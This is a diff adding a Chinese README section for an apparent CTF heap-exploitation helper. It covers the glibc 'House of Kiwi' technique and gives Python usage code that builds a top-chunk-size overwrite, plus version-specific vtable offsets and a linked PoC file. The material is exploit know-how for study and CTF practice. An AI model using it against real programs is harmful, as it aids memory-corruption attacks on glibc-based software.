@@ -38,6 +38,96 @@
 
 C 文件末尾列出了三段 wide-data 偏移和 stderr fake FILE 的伪代码。这个可执行主体只用来隔离验证 Kiwi 专属的触发器，最终的回调、ROP 链和投递方式仍然要按具体题目替换。
 
+## Python 离线板子
+
+[`kiwi.py`](./kiwi.py) 提供两个函数：
+
+```text
+build_house_of_kiwi         -> 返回 KiwiPlan
+build_house_of_kiwi_payload -> 返回 top chunk size 字段的 MemoryWrite
+```
+
+### 函数用途
+
+Kiwi 不是普通 fake FILE 最终触发点，而是：
+
+```text
+覆盖 top size
+-> sysmalloc 的 top invariant 断言
+-> 旧版 __malloc_assert
+-> __fxprintf(NULL, ...)
+-> fflush(stderr)
+```
+
+本函数只返回触发该路径所需的版本和 top size 参数，不生成 stderr/FILE。
+
+### 最小使用示例
+
+```python
+from kiwi import build_house_of_kiwi, build_house_of_kiwi_payload
+
+plan = build_house_of_kiwi(version="2.35", top_size=0x21)
+
+# 返回 KiwiPlan
+print(plan.version, hex(plan.top_size), hex(plan.wide_vtable_offset))
+# wide_vtable_offset 用于后续 stderr wide FILE 布局
+
+writes = build_house_of_kiwi_payload(
+    version="2.35",
+    top_size_addr=0x5555000,   # 相邻 top chunk 的 size 字段地址
+    top_size=0x21,
+)
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
+```
+
+### 对应 PoC
+
+- [`poc_malloc_assert_trigger_2.23_2.35.c`](./poc_malloc_assert_trigger_2.23_2.35.c)。
+
+### 参数
+
+| 参数 | 含义 |
+|---|---|
+| `version` | 目标 glibc 版本，支持 `2.23`～`2.35`。 |
+| `top_size` | 要写入相邻 top 的 `size`，默认 `0x21`；需满足对齐并保留 `PREV_INUSE`。 |
+
+### 返回对象 `KiwiPlan`
+
+| 字段 | 含义 |
+|---|---|
+| `version` | 目标版本。 |
+| `top_size` | 要写入的 top size。 |
+| `wide_vtable_offset` | 2.23～2.29 为 `0x130`，2.30 为 `0xf0`，2.31～2.35 为 `0xe0`；用于后续 stderr wide FILE 布局。 |
+
+### 返回对象 `MemoryWrite`
+
+`build_house_of_kiwi_payload` 返回一项写入：
+
+```text
+address = top_size_addr
+data    = top_size 的小端 8 字节
+label   = "top chunk size"
+```
+
+### 调用者必须提供
+
+```text
+能覆盖 top size 的原语
+能触发后续 malloc 进入 sysmalloc
+2.36 前版本的 stderr 可覆盖能力
+wide FILE 布局（Apple/其他消费链）
+```
+
+### 函数不负责
+
+```text
+不生成 stderr
+不生成 fake FILE
+不投递 top chunk
+2.36+ 不适用（__malloc_assert 已改 __libc_message）
+```
+
 ## 迁移与调试
 
 1. 覆盖 top size，让 sysmalloc 里的 old-top 不变量检查失败；只是触发一次普通的 `malloc_printerr` 并不等价于真正进入 `__malloc_assert`。
